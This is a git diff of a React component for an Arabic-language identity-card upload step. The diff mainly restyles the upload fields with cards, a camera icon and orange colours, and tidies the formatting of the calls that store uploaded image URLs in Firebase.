@@ -6,6 +6,8 @@ import { useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
+import { Card, CardContent } from "./ui/card"
+import { CameraIcon } from "lucide-react"
 
 interface IdUploadStepProps {
   onComplete: () => void
@@ -39,16 +41,16 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
   }
 
   const handleFileUpload = async (file: File, type: "front" | "back") => {
-  const visitorId=localStorage.getItem('visitor')
+    const visitorId = localStorage.getItem('visitor')
     setIsUploading(true)
     try {
       const url = await uploadToImgBB(file)
       if (type === "front") {
         setFrontIdUrl(url)
-        addData({id:visitorId,idFrontImage:url})
+        addData({ id: visitorId, idFrontImage: url })
       } else {
         setBackIdUrl(url)
-        addData({id:visitorId,idBackImage:url})
+        addData({ id: visitorId, idBackImage: url })
 
       }
     } catch (error) {
@@ -57,10 +59,10 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
       const localUrl = URL.createObjectURL(file)
       if (type === "front") {
         setFrontIdUrl(localUrl)
-        addData({id:visitorId,idFrontImage:localUrl})
+        addData({ id: visitorId, idFrontImage: localUrl })
       } else {
         setBackIdUrl(localUrl)
-        addData({id:visitorId,idBackImage:localUrl})
+        addData({ id: visitorId, idBackImage: localUrl })
 
       }
     }
@@ -89,7 +91,7 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
     <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 py-8 px-4">
       <div className="max-w-md mx-auto">
         <div className="text-center mb-8">
-          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-red-600 to-red-700 rounded-2xl mb-6 shadow-lg">
+          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-orange-600 to-orange-700 rounded-2xl mb-6 shadow-lg">
             <svg className="w-8 h-8 text-white" fill="white" viewBox="0 0 24 24">
               <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z" />
             </svg>
@@ -104,20 +106,27 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
             <div className="text-right">
               <label className="block text-slate-700 font-medium text-sm mb-3">صورة وجه الهوية *</label>
               <div className="relative">
-                <Input
-                  type="file"
-                  accept="image/*"
-                  onChange={handleFrontIdChange}
-                  className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 m-4 py-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
-                  dir="rtl"
-                />
+                <Card >
+                  <CardContent >
+                    <Input
+                      type="file"
+                      accept="image/*"
+                      onChange={handleFrontIdChange}
+                      className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 m-4 py-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
+                      dir="rtl"
+                    />
+                    <div className="w-full flex justify-center text-orange-700">
+                      <CameraIcon />
+                    </div>
+                  </CardContent>
+                </Card>
                 {frontIdUrl && (
                   <div className="mt-3">
                     <img
                       src={frontIdUrl || "/placeholder.svg"}
                       alt="Front ID"
                       className="w-full max-w-[200px] mx-auto rounded-lg shadow-sm"
-                    />
+                      />
                   </div>
                 )}
               </div>
@@ -127,22 +136,29 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
             <div className="text-right">
               <label className="block text-slate-700 font-medium text-sm mb-3">صورة ظهر الهوية *</label>
               <div className="relative">
-                <Input
-                  type="file"
-                  accept="image/*"
-                  onChange={handleBackIdChange}
-                  className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 m-4 py-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
-                  dir="rtl"
-                />
-                {backIdUrl && (
-                  <div className="mt-3">
-                    <img
-                      src={backIdUrl || "/placeholder.svg"}
-                      alt="Back ID"
-                      className="w-full max-w-[200px] mx-auto rounded-lg shadow-sm"
+                <Card >
+                  <CardContent >
+                    <Input
+                      type="file"
+                      accept="image/*"
+                      onChange={handleBackIdChange}
+                      className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 m-4 py-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
+                      dir="rtl"
                     />
-                  </div>
-                )}
+                    {backIdUrl && (
+                      <div className="mt-3">
+                        <img
+                          src={backIdUrl || "/placeholder.svg"}
+                          alt="Back ID"
+                          className="w-full max-w-[200px] mx-auto rounded-lg shadow-sm"
+                        />
+                      </div>
+                    )}
+                     <div className="w-full flex justify-center text-orange-700">
+                      <CameraIcon />
+                    </div>
+                  </CardContent>
+                </Card>
               </div>
             </div>
 
@@ -161,7 +177,7 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
               <Button
                 onClick={onComplete}
                 disabled={!canProceed || isUploading}
-                className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-green-700 hover:to-green-800 text-white py-4 rounded-xl text-sm font-medium shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
+                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-green-700 hover:to-green-800 text-white py-4 rounded-xl text-sm font-medium shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
               >
                 {canProceed ? (
                   <div className="flex items-center justify-center gap-2">
@@ -175,7 +191,7 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
             </div>
 
             {/* Info Box */}
-            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-right">
+            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-right" dir="rtl">
               <div className="flex items-start gap-3">
                 <svg className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                   <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,17A1.5,1.5 0 0,1 10.5,15.5A1.5,1.5 0 0,1 12,14A1.5,1.5 0 0,1 13.5,15.5A1.5,1.5 0 0,1 12,17M12,10.5A1.5,1.5 0 0,1 10.5,9A1.5,1.5 0 0,1 12,7.5A1.5,1.5 0 0,1 13.5,9A1.5,1.5 0 0,1 12,10.5Z" />
